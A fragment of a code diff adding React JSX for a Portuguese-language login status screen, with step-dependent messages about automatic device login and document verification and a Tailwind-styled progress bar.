+                  {authStep === 3 && (hasFoto ? 'Login Automático Realizado' : 'Acesso Confirmado')}
+                  {authStep === 4 && 'Acesso Confirmado'}
+                </h3>
+                
+                <p className="text-sm text-gray-600">
+                  {authStep === 0 && 'Estabelecendo conexão segura...'}
+                  {authStep === 1 && 'Este dispositivo já foi usado anteriormente. Fazendo login automaticamente...'}
+                  {authStep === 2 && (hasFoto ? 'Documento verificado com sucesso!' : 'Login efetuado com sucesso! Seu dispositivo já era conhecido pelo sistema.')}
+                  {authStep === 3 && (hasFoto ? 'Login efetuado com sucesso! Seu dispositivo já era conhecido pelo sistema.' : 'Redirecionando para sua área')}
+                  {authStep === 4 && 'Redirecionando para sua área'}
+                </p>
+              </div>
+              
+              {/* Barra de progresso simples */}
+              <div className="w-full bg-gray-200 h-1 mb-4">
+                <div 
+                  className={`h-1 bg-gray-600 transition-all duration-1000 ${
+                    authStep === 0 ? 'w-1/4' :
+                    authStep === 1 ? 'w-2/4' :
+                    authStep === 2 ? (hasFoto ? 'w-3/5' : 'w-3/4') :
+                    authStep === 3 ? (hasFoto ? 'w-4/5' : 'w-full') :
+                    'w-full'
+                  }`}
+                ></div>
+              </div>
+              
+            </div>
+          </div>
+        );
+      })()}
+
+    </div>
+  );
+}
